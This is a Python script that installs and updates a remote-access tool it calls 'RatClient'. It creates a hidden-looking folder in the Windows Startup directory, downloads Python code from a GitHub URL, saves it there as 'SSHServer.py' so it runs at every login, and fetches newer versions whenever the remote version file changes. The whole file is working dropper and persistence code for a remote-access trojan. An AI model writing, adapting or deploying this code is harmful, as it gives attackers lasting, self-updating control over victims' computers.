import requests
import os

startup_folder = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
VersionUrl = "https://raw.githubusercontent.com/Nacom-sys/PyRat/refs/heads/main/Version"
UpdateUrl = "https://raw.githubusercontent.com/Nacom-sys/PyRat/refs/heads/main/CurrentVersion.py"

folder_path = rf"{startup_folder}\cfr"
os.makedirs(folder_path, exist_ok=True)

response = requests.get(VersionUrl)
response.raise_for_status()
ServerVersion = response.text

if not os.path.isfile(rf"{startup_folder}\cfr\Version.txt"):
    print("Installing RatClient...")
    response = requests.get(UpdateUrl)
    response.raise_for_status()
    UpdateCode = response.text
    with open(rf"{startup_folder}\cfr\SSHServer.py", "w", encoding="utf-8") as f:
        f.write(UpdateCode)
    with open(rf"{startup_folder}\cfr\Version.txt", "w", encoding="utf-8") as f:
        f.write(ServerVersion)



def parse_version(v):
    return tuple(map(int, v.strip().lstrip("Vv").split(".")))


with open(rf"{startup_folder}\cfr\Version.txt", "r", encoding="utf-8") as f:
    Version = f.read()


if parse_version(ServerVersion) > parse_version(Version):
    print("Updating RatClient...")
    response = requests.get(UpdateUrl)
    response.raise_for_status()
    UpdateCode = response.text
    with open(rf"{startup_folder}\cfr\SSHServer.py", "w", encoding="utf-8") as f:
        f.write(UpdateCode)
    with open(rf"{startup_folder}\cfr\Version.txt", "w", encoding="utf-8") as f:
        f.write(ServerVersion)
